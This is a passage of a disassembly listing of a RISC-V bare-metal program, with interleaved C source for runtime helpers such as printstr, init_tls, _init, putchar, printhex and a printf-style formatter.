    80001a1c:	fddff0ef          	jal	ra,800019f8 <exit>

0000000080001a20 <printstr>:
}

void printstr(const char* s)
{
    80001a20:	7179                	addi	sp,sp,-48
    80001a22:	f406                	sd	ra,40(sp)
    80001a24:	f022                	sd	s0,32(sp)
    80001a26:	ec26                	sd	s1,24(sp)
    80001a28:	1800                	addi	s0,sp,48
    80001a2a:	fca43c23          	sd	a0,-40(s0)
  syscall(SYS_write, 1, (uintptr_t)s, strlen(s));
    80001a2e:	fd843483          	ld	s1,-40(s0)
    80001a32:	fd843503          	ld	a0,-40(s0)
    80001a36:	2c9000ef          	jal	ra,800024fe <strlen>
    80001a3a:	87aa                	mv	a5,a0
    80001a3c:	86be                	mv	a3,a5
    80001a3e:	8626                	mv	a2,s1
    80001a40:	4585                	li	a1,1
    80001a42:	04000513          	li	a0,64
    80001a46:	de9ff0ef          	jal	ra,8000182e <syscall>
}
    80001a4a:	0001                	nop
    80001a4c:	70a2                	ld	ra,40(sp)
    80001a4e:	7402                	ld	s0,32(sp)
    80001a50:	64e2                	ld	s1,24(sp)
    80001a52:	6145                	addi	sp,sp,48
    80001a54:	8082                	ret

0000000080001a56 <thread_entry>:

void __attribute__((weak)) thread_entry(int cid, int nc)
{
    80001a56:	1101                	addi	sp,sp,-32
    80001a58:	ec22                	sd	s0,24(sp)
    80001a5a:	1000                	addi	s0,sp,32
    80001a5c:	87aa                	mv	a5,a0
    80001a5e:	872e                	mv	a4,a1
    80001a60:	fef42623          	sw	a5,-20(s0)
    80001a64:	87ba                	mv	a5,a4
    80001a66:	fef42423          	sw	a5,-24(s0)
  // multi-threaded programs override this function.
  // for the case of single-threaded programs, only let core 0 proceed.
  while (cid != 0);
    80001a6a:	fec42783          	lw	a5,-20(s0)
    80001a6e:	2781                	sext.w	a5,a5
    80001a70:	ffed                	bnez	a5,80001a6a <thread_entry+0x14>
}
    80001a72:	0001                	nop
    80001a74:	0001                	nop
    80001a76:	6462                	ld	s0,24(sp)
    80001a78:	6105                	addi	sp,sp,32
    80001a7a:	8082                	ret

int __attribute__((weak)) main(int argc, char** argv)
{
    80001a7c:	1101                	addi	sp,sp,-32
    80001a7e:	ec06                	sd	ra,24(sp)
    80001a80:	e822                	sd	s0,16(sp)
    80001a82:	1000                	addi	s0,sp,32
    80001a84:	87aa                	mv	a5,a0
    80001a86:	feb43023          	sd	a1,-32(s0)
    80001a8a:	fef42623          	sw	a5,-20(s0)
  // single-threaded programs override this function.
  printstr("Implement main(), foo!\n");
    80001a8e:	00001517          	auipc	a0,0x1
    80001a92:	e2250513          	addi	a0,a0,-478 # 800028b0 <atol+0x26e>
    80001a96:	f8bff0ef          	jal	ra,80001a20 <printstr>
  return -1;
    80001a9a:	57fd                	li	a5,-1
}
    80001a9c:	853e                	mv	a0,a5
    80001a9e:	60e2                	ld	ra,24(sp)
    80001aa0:	6442                	ld	s0,16(sp)
    80001aa2:	6105                	addi	sp,sp,32
    80001aa4:	8082                	ret

0000000080001aa6 <init_tls>:

static void init_tls()
{
    80001aa6:	1101                	addi	sp,sp,-32
    80001aa8:	ec06                	sd	ra,24(sp)
    80001aaa:	e822                	sd	s0,16(sp)
    80001aac:	1000                	addi	s0,sp,32
  register void* thread_pointer asm("tp");
  extern char _tls_data;
  extern __thread char _tdata_begin, _tdata_end, _tbss_end;
  size_t tdata_size = &_tdata_end - &_tdata_begin;
    80001aae:	00020713          	mv	a4,tp
    80001ab2:	00020793          	mv	a5,tp
    80001ab6:	40f707b3          	sub	a5,a4,a5
    80001aba:	fef43423          	sd	a5,-24(s0)
  memcpy(thread_pointer, &_tls_data, tdata_size);
    80001abe:	8792                	mv	a5,tp
    80001ac0:	fe843603          	ld	a2,-24(s0)
    80001ac4:	00019597          	auipc	a1,0x19
    80001ac8:	7bc58593          	addi	a1,a1,1980 # 8001b280 <_end>
    80001acc:	853e                	mv	a0,a5
    80001ace:	0ab000ef          	jal	ra,80002378 <memcpy>
  size_t tbss_size = &_tbss_end - &_tdata_end;
    80001ad2:	08420713          	addi	a4,tp,132 # 84 <_tbss_end>
    80001ad6:	00020793          	mv	a5,tp
    80001ada:	40f707b3          	sub	a5,a4,a5
    80001ade:	fef43023          	sd	a5,-32(s0)
  memset(thread_pointer + tdata_size, 0, tbss_size);
    80001ae2:	8712                	mv	a4,tp
    80001ae4:	fe843783          	ld	a5,-24(s0)
    80001ae8:	97ba                	add	a5,a5,a4
    80001aea:	fe043603          	ld	a2,-32(s0)
    80001aee:	4581                	li	a1,0
    80001af0:	853e                	mv	a0,a5
    80001af2:	13f000ef          	jal	ra,80002430 <memset>
}
    80001af6:	0001                	nop
    80001af8:	60e2                	ld	ra,24(sp)
    80001afa:	6442                	ld	s0,16(sp)
    80001afc:	6105                	addi	sp,sp,32
    80001afe:	8082                	ret

0000000080001b00 <_init>:

void _init(int cid, int nc)
{
    80001b00:	7171                	addi	sp,sp,-176
    80001b02:	f506                	sd	ra,168(sp)
    80001b04:	f122                	sd	s0,160(sp)
    80001b06:	ed26                	sd	s1,152(sp)
    80001b08:	1900                	addi	s0,sp,176
    80001b0a:	87aa                	mv	a5,a0
    80001b0c:	872e                	mv	a4,a1
    80001b0e:	f4f42e23          	sw	a5,-164(s0)
    80001b12:	87ba                	mv	a5,a4
    80001b14:	f4f42c23          	sw	a5,-168(s0)
    80001b18:	fe040793          	addi	a5,s0,-32
    80001b1c:	f4f43823          	sd	a5,-176(s0)
    80001b20:	f5043783          	ld	a5,-176(s0)
    80001b24:	f8078793          	addi	a5,a5,-128
    80001b28:	03f78793          	addi	a5,a5,63
    80001b2c:	8399                	srli	a5,a5,0x6
    80001b2e:	00679493          	slli	s1,a5,0x6
  init_tls();
    80001b32:	f75ff0ef          	jal	ra,80001aa6 <init_tls>
  thread_entry(cid, nc);
    80001b36:	f5842703          	lw	a4,-168(s0)
    80001b3a:	f5c42783          	lw	a5,-164(s0)
    80001b3e:	85ba                	mv	a1,a4
    80001b40:	853e                	mv	a0,a5
    80001b42:	f15ff0ef          	jal	ra,80001a56 <thread_entry>

  // only single-threaded programs should ever get here.
  int ret = main(0, 0);
    80001b46:	4581                	li	a1,0
    80001b48:	4501                	li	a0,0
    80001b4a:	f10ff0ef          	jal	ra,8000125a <main>
    80001b4e:	87aa                	mv	a5,a0
    80001b50:	fcf42823          	sw	a5,-48(s0)

  char buf[NUM_COUNTERS * 32] __attribute__((aligned(64)));
  char* pbuf = buf;
    80001b54:	fc943c23          	sd	s1,-40(s0)
  for (int i = 0; i < NUM_COUNTERS; i++)
    80001b58:	fc042a23          	sw	zero,-44(s0)
    80001b5c:	a095                	j	80001bc0 <_init+0xc0>
    if (counters[i])
    80001b5e:	00019717          	auipc	a4,0x19
    80001b62:	6e270713          	addi	a4,a4,1762 # 8001b240 <counters>
    80001b66:	fd442783          	lw	a5,-44(s0)
    80001b6a:	078e                	slli	a5,a5,0x3
    80001b6c:	97ba                	add	a5,a5,a4
    80001b6e:	639c                	ld	a5,0(a5)
    80001b70:	c3b9                	beqz	a5,80001bb6 <_init+0xb6>
      pbuf += sprintf(pbuf, "%s = %ld\n", counter_names[i], counters[i]);
    80001b72:	00019717          	auipc	a4,0x19
    80001b76:	6de70713          	addi	a4,a4,1758 # 8001b250 <counter_names>
    80001b7a:	fd442783          	lw	a5,-44(s0)
    80001b7e:	078e                	slli	a5,a5,0x3
    80001b80:	97ba                	add	a5,a5,a4
    80001b82:	6390                	ld	a2,0(a5)
    80001b84:	00019717          	auipc	a4,0x19
    80001b88:	6bc70713          	addi	a4,a4,1724 # 8001b240 <counters>
    80001b8c:	fd442783          	lw	a5,-44(s0)
    80001b90:	078e                	slli	a5,a5,0x3
    80001b92:	97ba                	add	a5,a5,a4
    80001b94:	639c                	ld	a5,0(a5)
    80001b96:	86be                	mv	a3,a5
    80001b98:	00001597          	auipc	a1,0x1
    80001b9c:	d3058593          	addi	a1,a1,-720 # 800028c8 <atol+0x286>
    80001ba0:	fd843503          	ld	a0,-40(s0)
    80001ba4:	712000ef          	jal	ra,800022b6 <sprintf>
    80001ba8:	87aa                	mv	a5,a0
    80001baa:	873e                	mv	a4,a5
    80001bac:	fd843783          	ld	a5,-40(s0)
    80001bb0:	97ba                	add	a5,a5,a4
    80001bb2:	fcf43c23          	sd	a5,-40(s0)
  for (int i = 0; i < NUM_COUNTERS; i++)
    80001bb6:	fd442783          	lw	a5,-44(s0)
    80001bba:	2785                	addiw	a5,a5,1
    80001bbc:	fcf42a23          	sw	a5,-44(s0)
    80001bc0:	fd442783          	lw	a5,-44(s0)
    80001bc4:	0007871b          	sext.w	a4,a5
    80001bc8:	4785                	li	a5,1
    80001bca:	f8e7dae3          	ble	a4,a5,80001b5e <_init+0x5e>
  if (pbuf != buf)
    80001bce:	fd843783          	ld	a5,-40(s0)
    80001bd2:	00f48563          	beq	s1,a5,80001bdc <_init+0xdc>
    printstr(buf);
    80001bd6:	8526                	mv	a0,s1
    80001bd8:	e49ff0ef          	jal	ra,80001a20 <printstr>

  exit(ret);
    80001bdc:	fd042783          	lw	a5,-48(s0)
    80001be0:	853e                	mv	a0,a5
    80001be2:	e17ff0ef          	jal	ra,800019f8 <exit>

0000000080001be6 <putchar>:
}

#undef putchar
int putchar(int ch)
{
    80001be6:	1101                	addi	sp,sp,-32
    80001be8:	ec06                	sd	ra,24(sp)
    80001bea:	e822                	sd	s0,16(sp)
    80001bec:	1000                	addi	s0,sp,32
    80001bee:	87aa                	mv	a5,a0
    80001bf0:	fef42623          	sw	a5,-20(s0)
  static __thread char buf[64] __attribute__((aligned(64)));
  static __thread int buflen = 0;

  buf[buflen++] = ch;
    80001bf4:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001bf8:	0017871b          	addiw	a4,a5,1
    80001bfc:	0007069b          	sext.w	a3,a4
    80001c00:	08d22023          	sw	a3,128(tp) # 80 <buflen.2991>
    80001c04:	fec42703          	lw	a4,-20(s0)
    80001c08:	0ff77713          	andi	a4,a4,255
    80001c0c:	04020693          	addi	a3,tp,64 # 40 <buf.2990>
    80001c10:	97b6                	add	a5,a5,a3
    80001c12:	00e78023          	sb	a4,0(a5)

  if (ch == '\n' || buflen == sizeof(buf))
    80001c16:	fec42783          	lw	a5,-20(s0)
    80001c1a:	0007871b          	sext.w	a4,a5
    80001c1e:	47a9                	li	a5,10
    80001c20:	00f70963          	beq	a4,a5,80001c32 <putchar+0x4c>
    80001c24:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001c28:	873e                	mv	a4,a5
    80001c2a:	04000793          	li	a5,64
    80001c2e:	00f71f63          	bne	a4,a5,80001c4c <putchar+0x66>
  {
    syscall(SYS_write, 1, (uintptr_t)buf, buflen);
    80001c32:	04020713          	addi	a4,tp,64 # 40 <buf.2990>
    80001c36:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001c3a:	86be                	mv	a3,a5
    80001c3c:	863a                	mv	a2,a4
    80001c3e:	4585                	li	a1,1
    80001c40:	04000513          	li	a0,64
    80001c44:	bebff0ef          	jal	ra,8000182e <syscall>
    buflen = 0;
    80001c48:	08022023          	sw	zero,128(tp) # 80 <buflen.2991>
  }

  return 0;
    80001c4c:	4781                	li	a5,0
}
    80001c4e:	853e                	mv	a0,a5
    80001c50:	60e2                	ld	ra,24(sp)
    80001c52:	6442                	ld	s0,16(sp)
    80001c54:	6105                	addi	sp,sp,32
    80001c56:	8082                	ret

0000000080001c58 <printhex>:

void printhex(uint64_t x)
{
    80001c58:	7139                	addi	sp,sp,-64
    80001c5a:	fc06                	sd	ra,56(sp)
    80001c5c:	f822                	sd	s0,48(sp)
    80001c5e:	0080                	addi	s0,sp,64
    80001c60:	fca43423          	sd	a0,-56(s0)
  char str[17];
  int i;
  for (i = 0; i < 16; i++)
    80001c64:	fe042623          	sw	zero,-20(s0)
    80001c68:	a8a1                	j	80001cc0 <printhex+0x68>
  {
    str[15-i] = (x & 0xF) + ((x & 0xF) < 10 ? '0' : 'a'-10);
    80001c6a:	fc843783          	ld	a5,-56(s0)
    80001c6e:	0ff7f793          	andi	a5,a5,255
    80001c72:	8bbd                	andi	a5,a5,15
    80001c74:	0ff7f713          	andi	a4,a5,255
    80001c78:	fc843783          	ld	a5,-56(s0)
    80001c7c:	00f7f693          	andi	a3,a5,15
    80001c80:	47a5                	li	a5,9
    80001c82:	00d7e563          	bltu	a5,a3,80001c8c <printhex+0x34>
    80001c86:	03000793          	li	a5,48
    80001c8a:	a019                	j	80001c90 <printhex+0x38>
    80001c8c:	05700793          	li	a5,87
    80001c90:	463d                	li	a2,15
    80001c92:	fec42683          	lw	a3,-20(s0)
    80001c96:	40d606bb          	subw	a3,a2,a3
    80001c9a:	2681                	sext.w	a3,a3
    80001c9c:	9fb9                	addw	a5,a5,a4
    80001c9e:	0ff7f713          	andi	a4,a5,255
    80001ca2:	ff040793          	addi	a5,s0,-16
    80001ca6:	97b6                	add	a5,a5,a3
    80001ca8:	fee78423          	sb	a4,-24(a5)
    x >>= 4;
    80001cac:	fc843783          	ld	a5,-56(s0)
    80001cb0:	8391                	srli	a5,a5,0x4
    80001cb2:	fcf43423          	sd	a5,-56(s0)
  for (i = 0; i < 16; i++)
    80001cb6:	fec42783          	lw	a5,-20(s0)
    80001cba:	2785                	addiw	a5,a5,1
    80001cbc:	fef42623          	sw	a5,-20(s0)
    80001cc0:	fec42783          	lw	a5,-20(s0)
    80001cc4:	0007871b          	sext.w	a4,a5
    80001cc8:	47bd                	li	a5,15
    80001cca:	fae7d0e3          	ble	a4,a5,80001c6a <printhex+0x12>
  }
  str[16] = 0;
    80001cce:	fe040423          	sb	zero,-24(s0)

  printstr(str);
    80001cd2:	fd840793          	addi	a5,s0,-40
    80001cd6:	853e                	mv	a0,a5
    80001cd8:	d49ff0ef          	jal	ra,80001a20 <printstr>
}
    80001cdc:	0001                	nop
    80001cde:	70e2                	ld	ra,56(sp)
    80001ce0:	7442                	ld	s0,48(sp)
    80001ce2:	6121                	addi	sp,sp,64
    80001ce4:	8082                	ret

0000000080001ce6 <printnum>:

static inline void printnum(void (*putch)(int, void**), void **putdat,
                    unsigned long long num, unsigned base, int width, int padc)
{
    80001ce6:	714d                	addi	sp,sp,-336
    80001ce8:	e686                	sd	ra,328(sp)
    80001cea:	e2a2                	sd	s0,320(sp)
    80001cec:	0a80                	addi	s0,sp,336
    80001cee:	eca43c23          	sd	a0,-296(s0)
    80001cf2:	ecb43823          	sd	a1,-304(s0)
    80001cf6:	ecc43423          	sd	a2,-312(s0)
    80001cfa:	8636                	mv	a2,a3
    80001cfc:	86ba                	mv	a3,a4
    80001cfe:	873e                	mv	a4,a5
    80001d00:	87b2                	mv	a5,a2
    80001d02:	ecf42223          	sw	a5,-316(s0)
    80001d06:	87b6                	mv	a5,a3
    80001d08:	ecf42023          	sw	a5,-320(s0)
    80001d0c:	87ba                	mv	a5,a4
    80001d0e:	eaf42e23          	sw	a5,-324(s0)
  unsigned digs[sizeof(num)*CHAR_BIT];
  int pos = 0;
    80001d12:	fe042623          	sw	zero,-20(s0)

  while (1)
  {
    digs[pos++] = num % base;
    80001d16:	ec446783          	lwu	a5,-316(s0)
    80001d1a:	ec843703          	ld	a4,-312(s0)
    80001d1e:	02f776b3          	remu	a3,a4,a5
    80001d22:	fec42783          	lw	a5,-20(s0)
    80001d26:	0017871b          	addiw	a4,a5,1
    80001d2a:	fee42623          	sw	a4,-20(s0)
    80001d2e:	0006871b          	sext.w	a4,a3
    80001d32:	078a                	slli	a5,a5,0x2
    80001d34:	ff040693          	addi	a3,s0,-16
    80001d38:	97b6                	add	a5,a5,a3
    80001d3a:	eee7ac23          	sw	a4,-264(a5)
    if (num < base)
    80001d3e:	ec446783          	lwu	a5,-316(s0)
    80001d42:	ec843703          	ld	a4,-312(s0)
    80001d46:	00f76b63          	bltu	a4,a5,80001d5c <printnum+0x76>
      break;
    num /= base;
    80001d4a:	ec446783          	lwu	a5,-316(s0)
    80001d4e:	ec843703          	ld	a4,-312(s0)
    80001d52:	02f757b3          	divu	a5,a4,a5
    80001d56:	ecf43423          	sd	a5,-312(s0)
    digs[pos++] = num % base;
    80001d5a:	bf75                	j	80001d16 <printnum+0x30>
      break;
    80001d5c:	0001                	nop
  }

  while (width-- > pos)
    80001d5e:	a809                	j	80001d70 <printnum+0x8a>
    putch(padc, putdat);
    80001d60:	ebc42783          	lw	a5,-324(s0)
    80001d64:	ed843703          	ld	a4,-296(s0)
    80001d68:	ed043583          	ld	a1,-304(s0)
    80001d6c:	853e                	mv	a0,a5
    80001d6e:	9702                	jalr	a4
  while (width-- > pos)
    80001d70:	ec042783          	lw	a5,-320(s0)
    80001d74:	fff7871b          	addiw	a4,a5,-1
    80001d78:	ece42023          	sw	a4,-320(s0)
    80001d7c:	fec42703          	lw	a4,-20(s0)
    80001d80:	2701                	sext.w	a4,a4
    80001d82:	fcf74fe3          	blt	a4,a5,80001d60 <printnum+0x7a>

  while (pos-- > 0)
    80001d86:	a099                	j	80001dcc <printnum+0xe6>
    putch(digs[pos] + (digs[pos] >= 10 ? 'a' - 10 : '0'), putdat);
    80001d88:	fec42783          	lw	a5,-20(s0)
    80001d8c:	078a                	slli	a5,a5,0x2
    80001d8e:	ff040713          	addi	a4,s0,-16
    80001d92:	97ba                	add	a5,a5,a4
    80001d94:	ef87a703          	lw	a4,-264(a5)
    80001d98:	fec42783          	lw	a5,-20(s0)
    80001d9c:	078a                	slli	a5,a5,0x2
    80001d9e:	ff040693          	addi	a3,s0,-16
    80001da2:	97b6                	add	a5,a5,a3
    80001da4:	ef87a783          	lw	a5,-264(a5)
    80001da8:	86be                	mv	a3,a5
    80001daa:	47a5                	li	a5,9
    80001dac:	00d7f563          	bleu	a3,a5,80001db6 <printnum+0xd0>
    80001db0:	05700793          	li	a5,87
    80001db4:	a019                	j	80001dba <printnum+0xd4>
    80001db6:	03000793          	li	a5,48
    80001dba:	9fb9                	addw	a5,a5,a4
    80001dbc:	2781                	sext.w	a5,a5
    80001dbe:	2781                	sext.w	a5,a5
    80001dc0:	ed843703          	ld	a4,-296(s0)
    80001dc4:	ed043583          	ld	a1,-304(s0)
    80001dc8:	853e                	mv	a0,a5
    80001dca:	9702                	jalr	a4
  while (pos-- > 0)
    80001dcc:	fec42783          	lw	a5,-20(s0)
    80001dd0:	fff7871b          	addiw	a4,a5,-1
    80001dd4:	fee42623          	sw	a4,-20(s0)
    80001dd8:	faf048e3          	bgtz	a5,80001d88 <printnum+0xa2>
}
    80001ddc:	0001                	nop
    80001dde:	0001                	nop
    80001de0:	60b6                	ld	ra,328(sp)
    80001de2:	6416                	ld	s0,320(sp)
    80001de4:	6171                	addi	sp,sp,336
    80001de6:	8082                	ret

0000000080001de8 <getuint>:

static unsigned long long getuint(va_list *ap, int lflag)
{
    80001de8:	1101                	addi	sp,sp,-32
    80001dea:	ec22                	sd	s0,24(sp)
    80001dec:	1000                	addi	s0,sp,32
    80001dee:	fea43423          	sd	a0,-24(s0)
    80001df2:	87ae                	mv	a5,a1
    80001df4:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001df8:	fe442783          	lw	a5,-28(s0)
    80001dfc:	0007871b          	sext.w	a4,a5
    80001e00:	4785                	li	a5,1
    80001e02:	00e7dc63          	ble	a4,a5,80001e1a <getuint+0x32>
    return va_arg(*ap, unsigned long long);
    80001e06:	fe843783          	ld	a5,-24(s0)
    80001e0a:	639c                	ld	a5,0(a5)
    80001e0c:	00878693          	addi	a3,a5,8
    80001e10:	fe843703          	ld	a4,-24(s0)
    80001e14:	e314                	sd	a3,0(a4)
    80001e16:	639c                	ld	a5,0(a5)
    80001e18:	a815                	j	80001e4c <getuint+0x64>
  else if (lflag)
    80001e1a:	fe442783          	lw	a5,-28(s0)
    80001e1e:	2781                	sext.w	a5,a5
    80001e20:	cb99                	beqz	a5,80001e36 <getuint+0x4e>
    return va_arg(*ap, unsigned long);
    80001e22:	fe843783          	ld	a5,-24(s0)
    80001e26:	639c                	ld	a5,0(a5)
    80001e28:	00878693          	addi	a3,a5,8
    80001e2c:	fe843703          	ld	a4,-24(s0)
    80001e30:	e314                	sd	a3,0(a4)
    80001e32:	639c                	ld	a5,0(a5)
    80001e34:	a821                	j	80001e4c <getuint+0x64>
  else
    return va_arg(*ap, unsigned int);
    80001e36:	fe843783          	ld	a5,-24(s0)
    80001e3a:	639c                	ld	a5,0(a5)
    80001e3c:	00878693          	addi	a3,a5,8
    80001e40:	fe843703          	ld	a4,-24(s0)
    80001e44:	e314                	sd	a3,0(a4)
    80001e46:	439c                	lw	a5,0(a5)
    80001e48:	1782                	slli	a5,a5,0x20
    80001e4a:	9381                	srli	a5,a5,0x20
}
    80001e4c:	853e                	mv	a0,a5
    80001e4e:	6462                	ld	s0,24(sp)
    80001e50:	6105                	addi	sp,sp,32
    80001e52:	8082                	ret

0000000080001e54 <getint>:

static long long getint(va_list *ap, int lflag)
{
    80001e54:	1101                	addi	sp,sp,-32
    80001e56:	ec22                	sd	s0,24(sp)
    80001e58:	1000                	addi	s0,sp,32
    80001e5a:	fea43423          	sd	a0,-24(s0)
    80001e5e:	87ae                	mv	a5,a1
    80001e60:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001e64:	fe442783          	lw	a5,-28(s0)
    80001e68:	0007871b          	sext.w	a4,a5
    80001e6c:	4785                	li	a5,1
    80001e6e:	00e7dc63          	ble	a4,a5,80001e86 <getint+0x32>
    return va_arg(*ap, long long);
    80001e72:	fe843783          	ld	a5,-24(s0)
    80001e76:	639c                	ld	a5,0(a5)
    80001e78:	00878693          	addi	a3,a5,8
    80001e7c:	fe843703          	ld	a4,-24(s0)
    80001e80:	e314                	sd	a3,0(a4)
    80001e82:	639c                	ld	a5,0(a5)
    80001e84:	a805                	j	80001eb4 <getint+0x60>
  else if (lflag)
    80001e86:	fe442783          	lw	a5,-28(s0)
    80001e8a:	2781                	sext.w	a5,a5
    80001e8c:	cb99                	beqz	a5,80001ea2 <getint+0x4e>
    return va_arg(*ap, long);
    80001e8e:	fe843783          	ld	a5,-24(s0)
    80001e92:	639c                	ld	a5,0(a5)
    80001e94:	00878693          	addi	a3,a5,8
    80001e98:	fe843703          	ld	a4,-24(s0)
    80001e9c:	e314                	sd	a3,0(a4)
    80001e9e:	639c                	ld	a5,0(a5)
    80001ea0:	a811                	j	80001eb4 <getint+0x60>
  else
    return va_arg(*ap, int);
    80001ea2:	fe843783          	ld	a5,-24(s0)
    80001ea6:	639c                	ld	a5,0(a5)
    80001ea8:	00878693          	addi	a3,a5,8
    80001eac:	fe843703          	ld	a4,-24(s0)
    80001eb0:	e314                	sd	a3,0(a4)
    80001eb2:	439c                	lw	a5,0(a5)
}
    80001eb4:	853e                	mv	a0,a5
    80001eb6:	6462                	ld	s0,24(sp)
    80001eb8:	6105                	addi	sp,sp,32
    80001eba:	8082                	ret

0000000080001ebc <vprintfmt>:

static void vprintfmt(void (*putch)(int, void**), void **putdat, const char *fmt, va_list ap)
{
    80001ebc:	7159                	addi	sp,sp,-112
    80001ebe:	f486                	sd	ra,104(sp)
    80001ec0:	f0a2                	sd	s0,96(sp)
    80001ec2:	eca6                	sd	s1,88(sp)
    80001ec4:	e8ca                	sd	s2,80(sp)
    80001ec6:	1880                	addi	s0,sp,112
    80001ec8:	faa43423          	sd	a0,-88(s0)
    80001ecc:	fab43023          	sd	a1,-96(s0)
    80001ed0:	f8c43c23          	sd	a2,-104(s0)
    80001ed4:	f8d43823          	sd	a3,-112(s0)
  unsigned long long num;
  int base, lflag, width, precision, altflag;
  char padc;

  while (1) {
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001ed8:	a831                	j	80001ef4 <vprintfmt+0x38>
      if (ch == '\0')
    80001eda:	32048963          	beqz	s1,8000220c <vprintfmt+0x350>
        return;
      fmt++;
    80001ede:	f9843783          	ld	a5,-104(s0)
    80001ee2:	0785                	addi	a5,a5,1
    80001ee4:	f8f43c23          	sd	a5,-104(s0)
      putch(ch, putdat);
    80001ee8:	fa843783          	ld	a5,-88(s0)
    80001eec:	fa043583          	ld	a1,-96(s0)
    80001ef0:	8526                	mv	a0,s1
    80001ef2:	9782                	jalr	a5
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001ef4:	f9843783          	ld	a5,-104(s0)
    80001ef8:	0007c783          	lbu	a5,0(a5)
    80001efc:	0007849b          	sext.w	s1,a5
    80001f00:	8726                	mv	a4,s1
    80001f02:	02500793          	li	a5,37
    80001f06:	fcf71ae3          	bne	a4,a5,80001eda <vprintfmt+0x1e>
    }
    fmt++;
    80001f0a:	f9843783          	ld	a5,-104(s0)
    80001f0e:	0785                	addi	a5,a5,1
    80001f10:	f8f43c23          	sd	a5,-104(s0)

    // Process a %-escape sequence
    last_fmt = fmt;
    80001f14:	f9843783          	ld	a5,-104(s0)
    80001f18:	faf43c23          	sd	a5,-72(s0)
    padc = ' ';
    80001f1c:	02000793          	li	a5,32
    80001f20:	fcf403a3          	sb	a5,-57(s0)
    width = -1;
    80001f24:	57fd                	li	a5,-1
    80001f26:	fcf42623          	sw	a5,-52(s0)
    precision = -1;
    80001f2a:	57fd                	li	a5,-1
    80001f2c:	fcf42423          	sw	a5,-56(s0)
    lflag = 0;
    80001f30:	fc042823          	sw	zero,-48(s0)
    altflag = 0;
    80001f34:	fa042a23          	sw	zero,-76(s0)
  reswitch:
    switch (ch = *(unsigned char *) fmt++) {
    80001f38:	f9843783          	ld	a5,-104(s0)
    80001f3c:	00178713          	addi	a4,a5,1
    80001f40:	f8e43c23          	sd	a4,-104(s0)
    80001f44:	0007c783          	lbu	a5,0(a5)
    80001f48:	0007849b          	sext.w	s1,a5
    80001f4c:	fdd4869b          	addiw	a3,s1,-35
    80001f50:	0006871b          	sext.w	a4,a3
    80001f54:	05500793          	li	a5,85
    80001f58:	28e7ed63          	bltu	a5,a4,800021f2 <vprintfmt+0x336>
    80001f5c:	02069793          	slli	a5,a3,0x20
    80001f60:	9381                	srli	a5,a5,0x20
    80001f62:	00279713          	slli	a4,a5,0x2
    80001f66:	00001797          	auipc	a5,0x1
    80001f6a:	97a78793          	addi	a5,a5,-1670 # 800028e0 <atol+0x29e>
    80001f6e:	97ba                	add	a5,a5,a4
    80001f70:	439c                	lw	a5,0(a5)
    80001f72:	0007871b          	sext.w	a4,a5
    80001f76:	00001797          	auipc	a5,0x1
    80001f7a:	96a78793          	addi	a5,a5,-1686 # 800028e0 <atol+0x29e>
    80001f7e:	97ba                	add	a5,a5,a4
    80001f80:	8782                	jr	a5

    // flag to pad on the right
    case '-':
      padc = '-';
    80001f82:	02d00793          	li	a5,45
    80001f86:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    80001f8a:	b77d                	j	80001f38 <vprintfmt+0x7c>
      
    // flag to pad with 0's instead of spaces
    case '0':
      padc = '0';
    80001f8c:	03000793          	li	a5,48
    80001f90:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    80001f94:	b755                	j	80001f38 <vprintfmt+0x7c>
    case '5':
    case '6':
    case '7':
    case '8':
    case '9':
      for (precision = 0; ; ++fmt) {
    80001f96:	fc042423          	sw	zero,-56(s0)
        precision = precision * 10 + ch - '0';
    80001f9a:	fc842703          	lw	a4,-56(s0)
    80001f9e:	87ba                	mv	a5,a4
    80001fa0:	0027979b          	slliw	a5,a5,0x2
    80001fa4:	9fb9                	addw	a5,a5,a4
    80001fa6:	0017979b          	slliw	a5,a5,0x1
    80001faa:	2781                	sext.w	a5,a5
    80001fac:	9fa5                	addw	a5,a5,s1
    80001fae:	2781                	sext.w	a5,a5
    80001fb0:	fd07879b          	addiw	a5,a5,-48
    80001fb4:	fcf42423          	sw	a5,-56(s0)
        ch = *fmt;
    80001fb8:	f9843783          	ld	a5,-104(s0)
    80001fbc:	0007c783          	lbu	a5,0(a5)
    80001fc0:	0007849b          	sext.w	s1,a5
        if (ch < '0' || ch > '9')
    80001fc4:	8726                	mv	a4,s1
    80001fc6:	02f00793          	li	a5,47
    80001fca:	04e7d363          	ble	a4,a5,80002010 <vprintfmt+0x154>
    80001fce:	8726                	mv	a4,s1
    80001fd0:	03900793          	li	a5,57
    80001fd4:	02e7ce63          	blt	a5,a4,80002010 <vprintfmt+0x154>
      for (precision = 0; ; ++fmt) {
    80001fd8:	f9843783          	ld	a5,-104(s0)
    80001fdc:	0785                	addi	a5,a5,1
    80001fde:	f8f43c23          	sd	a5,-104(s0)
        precision = precision * 10 + ch - '0';
    80001fe2:	bf65                	j	80001f9a <vprintfmt+0xde>
          break;
      }
      goto process_precision;

    case '*':
      precision = va_arg(ap, int);
    80001fe4:	f9043783          	ld	a5,-112(s0)
    80001fe8:	00878713          	addi	a4,a5,8
    80001fec:	f8e43823          	sd	a4,-112(s0)
    80001ff0:	439c                	lw	a5,0(a5)
    80001ff2:	fcf42423          	sw	a5,-56(s0)
      goto process_precision;
    80001ff6:	a831                	j	80002012 <vprintfmt+0x156>

    case '.':
      if (width < 0)
    80001ff8:	fcc42783          	lw	a5,-52(s0)
    80001ffc:	2781                	sext.w	a5,a5
    80001ffe:	f207dde3          	bgez	a5,80001f38 <vprintfmt+0x7c>
        width = 0;
    80002002:	fc042623          	sw	zero,-52(s0)
      goto reswitch;
    80002006:	bf0d                	j	80001f38 <vprintfmt+0x7c>

    case '#':
      altflag = 1;
    80002008:	4785                	li	a5,1
    8000200a:	faf42a23          	sw	a5,-76(s0)
      goto reswitch;
    8000200e:	b72d                	j	80001f38 <vprintfmt+0x7c>
      goto process_precision;
    80002010:	0001                	nop

    process_precision:
      if (width < 0)
    80002012:	fcc42783          	lw	a5,-52(s0)
    80002016:	2781                	sext.w	a5,a5
    80002018:	f207d0e3          	bgez	a5,80001f38 <vprintfmt+0x7c>
